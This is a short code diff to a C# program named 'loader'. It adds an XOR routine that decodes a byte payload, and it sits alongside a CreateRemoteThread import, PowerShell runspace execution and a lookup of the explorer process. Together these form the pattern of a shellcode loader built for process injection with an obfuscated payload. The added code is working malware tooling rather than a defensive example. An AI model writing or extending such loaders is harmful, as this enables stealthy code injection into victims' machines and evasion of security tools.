@@ -29,6 +29,14 @@ namespace loader
 
         [DllImport("kernel32.dll")]
         static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+        static byte[] decode(byte[] payload, int key)
+        {
+            for (int i = 0; i < payload.Length; i++)
+            {
+                payload[i] ^= (byte)key;
+            }
+            return payload;
+        }
 
         public static void Main(string[] args)
         {
@@ -64,7 +72,7 @@ namespace loader
             ps.Runspace = rs;
             ps.AddScript(cmd);
             ps.Invoke();
-
+            rs.Close();
             Process[] processes = Process.GetProcessesByName("explorer");
             int pid = processes[0].Id;
 
